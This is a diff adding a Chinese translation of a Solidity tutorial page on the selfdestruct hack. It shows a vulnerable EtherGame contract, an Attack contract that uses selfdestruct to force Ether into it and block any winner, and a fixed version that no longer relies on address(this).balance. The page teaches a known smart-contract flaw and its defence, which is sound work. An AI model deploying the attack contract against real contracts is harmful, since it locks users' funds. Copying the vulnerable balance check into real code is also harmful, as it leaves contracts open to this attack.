@@ -1,0 +1,115 @@
+# 自毁函数
+
+对应英文原页：https://solidity-by-example.org/hacks/self-destruct
+
+通过调用 `selfdestruct`，可以从区块链上删除合约。
+
+`selfdestruct` 会把合约中剩余的 Ether 全部发送到
+指定地址。
+
+## 漏洞
+
+恶意合约可以使用 `selfdestruct`
+强制向任意合约发送 Ether。
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+// 这款游戏的目标是成为第 7 位存入 1 Ether 的玩家。
+// 玩家每次只能存入 1 Ether。
+// 获胜者将能够提取全部 Ether。
+
+/*
+1. 部署 EtherGame
+2. 玩家（比如 Alice 和 Bob）决定参与，各存入 1 Ether。
+2. 使用 EtherGame 的地址部署 Attack
+3. 调用 Attack.attack 并发送 5 ether。这将破坏游戏
+   没有人能成为获胜者。
+
+发生了什么？
+Attack 迫使 EtherGame 的余额等于 7 ether。
+现在没有人能再存款，也无法设置获胜者。
+*/
+
+contract EtherGame {
+    uint256 public constant TARGET_AMOUNT = 7 ether;
+    address public winner;
+
+    function deposit() public payable {
+        require(msg.value == 1 ether, "You can only send 1 Ether");
+
+        uint256 balance = address(this).balance;
+        require(balance <= TARGET_AMOUNT, "Game is over");
+
+        if (balance == TARGET_AMOUNT) {
+            winner = msg.sender;
+        }
+    }
+
+    function claimReward() public {
+        require(msg.sender == winner, "Not winner");
+
+        (bool sent,) = msg.sender.call{value: address(this).balance}("");
+        require(sent, "Failed to send Ether");
+    }
+}
+
+contract Attack {
+    EtherGame etherGame;
+
+    constructor(EtherGame _etherGame) {
+        etherGame = EtherGame(_etherGame);
+    }
+
+    function attack() public payable {
+        // 只需发送 ether，使游戏余额 >= 7 ether，
+        // 就可以破坏游戏
+
+        // 将地址转换为 payable
+        address payable addr = payable(address(etherGame));
+        selfdestruct(addr);
+    }
+}
+```
+
+## 预防措施
+
+不要依赖 `address(this).balance`
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+contract EtherGame {
+    uint256 public constant TARGET_AMOUNT = 7 ether;
+    uint256 public balance;
+    address public winner;
+
+    function deposit() public payable {
+        require(msg.value == 1 ether, "You can only send 1 Ether");
+
+        balance += msg.value;
+        require(balance <= TARGET_AMOUNT, "Game is over");
+
+        if (balance == TARGET_AMOUNT) {
+            winner = msg.sender;
+        }
+    }
+
+    function claimReward() public {
+        require(msg.sender == winner, "Not winner");
+        uint256 amount = balance;
+        balance = 0;
+        (bool sent,) = msg.sender.call{value: amount}("");
+        require(sent, "Failed to send Ether");
+    }
+}
+```
+
+---
+## 关注我们
+[Yanbo的Twitter](https://x.com/Yanbo2004)｜[Web3Club的Twitter](https://twitter.com/Web3ClubCN)
+
+
+[加入我们](https://github.com/Web3-Club/Intro./blob/main/Join%20club.md)
